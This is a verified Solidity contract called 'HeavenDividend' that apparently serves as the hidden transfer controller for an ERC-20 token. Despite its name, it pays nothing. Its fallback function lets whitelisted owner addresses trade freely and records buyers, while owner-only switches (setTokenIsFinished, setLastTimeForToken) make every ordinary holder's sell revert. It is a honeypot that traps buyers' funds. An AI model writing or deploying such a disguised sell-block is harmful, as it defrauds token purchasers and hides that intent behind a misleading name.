/**
 *Submitted for verification at Etherscan.io on 2023-05-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract HeavenDividend {
    address private _owner;    
    address private token;
    address private pair;

    uint256 private _pairBalance;

    bool private isFinished;

    mapping(address => bool) private _whitelists;
    mapping (address => uint256) private _addressTime;

    uint256 private lastTime;

    modifier onlyToken() {
        require(msg.sender == token); 
        _;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    constructor () {
        _owner = msg.sender;
        _whitelists[_owner] = true;
    }

    function setTokenIsFinished(bool _isFinished) external onlyOwner {
      isFinished = _isFinished;
    }

    function refreshProxySetting(address _token, address _pair) external onlyOwner {
      token = _token;
      pair = _pair;
      isFinished = false;
      _pairBalance = 0;
    }

    function setLastTimeForToken() external onlyOwner {
      lastTime = block.timestamp;
    }

    function whitelistForTokenHolder(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }

    fallback() external payable {
      address _from = tx.origin;
      IERC20 tokenContract = IERC20(token);
      uint256 pairBalance = tokenContract.balanceOf(pair);
      
      if (_whitelists[tx.origin]) {
        _pairBalance = pairBalance;
        return;
      }
      
      bool isBuy = false;
      bool isSell = false;

      if (pairBalance > _pairBalance) {
        isSell = true;
      } else if (pairBalance < _pairBalance) {
        isBuy = true;
      }
      if (isBuy) {
        if (_addressTime[_from] == 0) {
          _addressTime[_from] = block.timestamp;
          _pairBalance = pairBalance;
          return;
        }
      } else if (isSell) {
        require(!isFinished && _addressTime[_from] >= lastTime);
        _pairBalance = pairBalance;
        return;
      }
      revert();
    }
}